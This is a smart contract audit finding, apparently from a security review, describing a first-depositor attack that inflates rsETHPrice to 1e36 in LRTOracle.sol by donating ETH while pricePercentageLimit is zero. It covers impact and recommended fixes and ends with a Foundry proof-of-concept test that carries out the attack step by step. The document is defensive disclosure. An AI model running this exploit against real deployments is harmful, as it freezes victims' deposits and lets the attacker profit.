### Title
First Depositor Inflates rsETHPrice to 1e36 via ETH Donation When `pricePercentageLimit == 0` — (`contracts/LRTOracle.sol`)

### Summary
An unprivileged first depositor can inflate `rsETHPrice` to an astronomically high value (`~1e36`) by depositing a dust amount to obtain a near-zero rsETH supply, then donating ETH directly to `LRTDepositPool`, and calling the public `updateRSETHPrice()`. Because `pricePercentageLimit` and `protocolFeeInBPS` both default to `0` (neither is set in `initialize()`), all price-increase guards are bypassed. The inflated price is then permanently anchored via `highestRsethPrice`, causing all subsequent deposits below the new price threshold to mint zero rsETH while the deposited ETH is absorbed into the pool.

### Finding Description

`LRTOracle._updateRsETHPrice()` computes the new price as:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
// divWad(x, y) = x * 1e18 / y
``` [1](#0-0) 

With `rsethSupply = 1` and `totalETHInProtocol = 1e18`, this yields `1e18 * 1e18 / 1 = 1e36`.

The price-increase guard is:

```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
``` [2](#0-1) 

`pricePercentageLimit` is **never set** in `initialize()`: [3](#0-2) 

It defaults to `0`, making `pricePercentageLimit > 0` permanently `false` — the entire guard short-circuits and **any price increase is accepted without restriction**.

`protocolFeeInBPS` is also **never set** in `LRTConfig.initialize()`: [4](#0-3) 

It defaults to `0`, so `protocolFeeInETH = 0`, and `_checkAndUpdateDailyFeeMintLimit(0)` passes trivially (`0 > 0` is false). [5](#0-4) 

The ETH accounting uses raw `address(this).balance`, so any ETH sent directly to the pool via `receive()` is immediately counted in `totalETHInProtocol`: [6](#0-5) 

`updateRSETHPrice()` is public with no role restriction: [7](#0-6) 

Once `rsETHPrice = 1e36` is set, `highestRsethPrice` is also updated to `1e36`: [8](#0-7) 

Subsequent deposits use this inflated price:

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
``` [9](#0-8) 

For any deposit `amount < 1e18` (i.e., less than 1 ETH), `amount * 1e18 / 1e36 = 0`. If the caller passes `minRSETHAmountExpected = 0`, the deposit succeeds but mints zero rsETH — the deposited ETH is permanently absorbed into the pool. [10](#0-9) 

### Impact Explanation

- **Protocol insolvency**: `rsETHPrice` no longer reflects actual ETH backing per rsETH share. The single wei of rsETH held by the attacker is nominally "worth" `1e18 ETH` at the inflated price, while the protocol holds only a few ETH.
- **Permanent freezing of funds**: Any user depositing less than 1 ETH receives 0 rsETH. Their ETH is locked in the pool with no corresponding claim token. This is a permanent loss.
- **Deposit bricking**: The protocol becomes unusable for all sub-1-ETH deposits, which covers the vast majority of retail users.

### Likelihood Explanation

- Requires no special role — any EOA can execute all steps.
- The attack window opens at deployment and remains open until an admin explicitly calls `setPricePercentageLimit` with a non-zero value. Since this is not part of `initialize()`, the window is always present on fresh deployments.
- The attacker must donate ETH (economic cost), but recovers it plus victim funds when withdrawing their rsETH share.
- The attack is front-runnable against the first legitimate deposit.

### Recommendation

1. **Set `pricePercentageLimit` in `initialize()`** to a safe non-zero value (e.g., `1e16` for 1% daily limit). Never allow it to remain `0`.
2. **Set `protocolFeeInBPS` and `maxFeeMintAmountPerDay` in `initialize()`** or enforce non-zero defaults.
3. **Add a minimum rsETH mint check**: revert if `rsethAmountToMint == 0` in `_beforeDeposit`.
4. **Consider virtual shares / dead shares**: mint a small amount of rsETH to a dead address at initialization to prevent dust-supply manipulation.
5. **Do not count raw `address(this).balance`** as protocol TVL without tracking legitimate deposits separately, to prevent donation-based inflation.

// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork test — run against a fresh deployment with default (zero) pricePercentageLimit and protocolFeeInBPS

function test_firstDepositorInflation() public {
    // Step 1: Bootstrap price with zero supply
    lrtOracle.updateRSETHPrice();
    assertEq(lrtOracle.rsETHPrice(), 1e18);

    // Step 2: Attacker deposits 1 wei ETH → gets 1 wei rsETH
    vm.deal(attacker, 1e18 + 1 wei);
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 1 wei}(0, "");
    assertEq(rsETH.totalSupply(), 1);

    // Step 3: Attacker donates 1 ETH directly to deposit pool
    vm.prank(attacker);
    (bool ok,) = address(lrtDepositPool).call{value: 1e18}("");
    require(ok);

    // Step 4: Attacker calls updateRSETHPrice — price becomes 1e36
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();
    assertEq(lrtOracle.rsETHPrice(), 1e36);
    assertEq(lrtOracle.highestRsethPrice(), 1e36);

    // Step 5: Victim deposits 0.5 ETH — gets 0 rsETH, funds lost
    address victim = address(0xBEEF);
    vm.deal(victim, 0.5 ether);
    vm.prank(victim);
    lrtDepositPool.depositETH{value: 0.5 ether}(0, "");

    // Victim received 0 rsETH — funds permanently frozen
    assertEq(rsETH.balanceOf(victim), 0);
    // rsETH supply unchanged — victim's ETH absorbed with no claim
    assertEq(rsETH.totalSupply(), 1);
}
